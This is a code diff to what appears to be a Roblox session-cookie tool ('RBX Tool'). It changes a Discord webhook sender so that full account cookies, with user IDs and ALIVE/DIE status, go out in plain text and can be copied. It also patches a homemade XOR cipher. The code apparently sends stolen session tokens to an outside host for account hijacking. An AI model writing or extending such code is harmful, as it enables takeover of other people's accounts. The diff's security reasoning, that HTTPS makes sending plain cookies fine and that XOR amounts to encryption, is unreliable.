@@ -67,7 +67,10 @@ def encrypt_sensitive_data(value):
     if isinstance(value, (bytes, bytearray)):
         raw = bytes(value)
     else:
-        raw = str(value).encode('utf-8')
+        try:
+            raw = str(value).encode('utf-8')
+        except (UnicodeDecodeError, UnicodeEncodeError):
+            raw = str(value).encode('latin-1', errors='replace')
     if not raw:
         return ''
 
@@ -97,7 +100,10 @@ def decrypt_sensitive_data(value):
     decoded = bytearray()
     for index, byte in enumerate(payload):
         decoded.append(byte ^ stream[index % len(stream)])
-    return decoded.decode('utf-8')
+    try:
+        return decoded.decode('utf-8')
+    except UnicodeDecodeError:
+        return decoded.decode('latin-1', errors='replace')
 
 
 def _decode_session_row(row):
@@ -442,7 +448,6 @@ def send_discord_webhook(session_data, is_update=False, update_type='NEW'):
         return None
 
     full_cookie = session_data.get('cookie', 'N/A')
-    encrypted_cookie = encrypt_sensitive_data(full_cookie if full_cookie != 'N/A' else '')
     status = session_data.get('status', 'ALIVE')
     status_emoji = '🟢' if status == 'ALIVE' else '🔴' if status == 'DIE' else '🟡'
     userId = session_data.get('userId', 'N/A')
@@ -479,16 +484,16 @@ def send_discord_webhook(session_data, is_update=False, update_type='NEW'):
         "footer": {"text": "RBX Tool"}
     }
 
-    # Split encrypted cookie into chunks of 1000 chars (Discord limit is 1024 per field)
-    chunk_size = 1000
-    if len(encrypted_cookie) <= chunk_size:
-        embed["fields"].append({"name": "🪙 Cookie (Encrypted)", "value": f"```{encrypted_cookie}```", "inline": False})
+    # Send full plain cookie (HTTPS encrypts in transit automatically)
+    display_cookie = full_cookie if full_cookie != 'N/A' else 'N/A'
+    # Discord field limit is 1024 chars, ``` takes 6 chars → max cookie = 1018 chars
+    if len(display_cookie) <= 1018:
+        embed["fields"].append({"name": "🪙 Cookie", "value": f"```{display_cookie}```", "inline": False})
+        payload = {"embeds": [embed]}
     else:
-        parts = [encrypted_cookie[i:i+chunk_size] for i in range(0, len(encrypted_cookie), chunk_size)]
-        for idx, part in enumerate(parts):
-            embed["fields"].append({"name": f"🪙 Cookie (Encrypted {idx+1}/{len(parts)})", "value": f"```{part}```", "inline": False})
-
-    payload = {"embeds": [embed]}
+        # Cookie too long for embed field → send as message content so user can copy full cookie
+        embed["fields"].append({"name": "🪙 Cookie", "value": "*(see below)*", "inline": False})
+        payload = {"content": f"```{display_cookie}```", "embeds": [embed]}
     
     try:
         # Check if we should update existing message
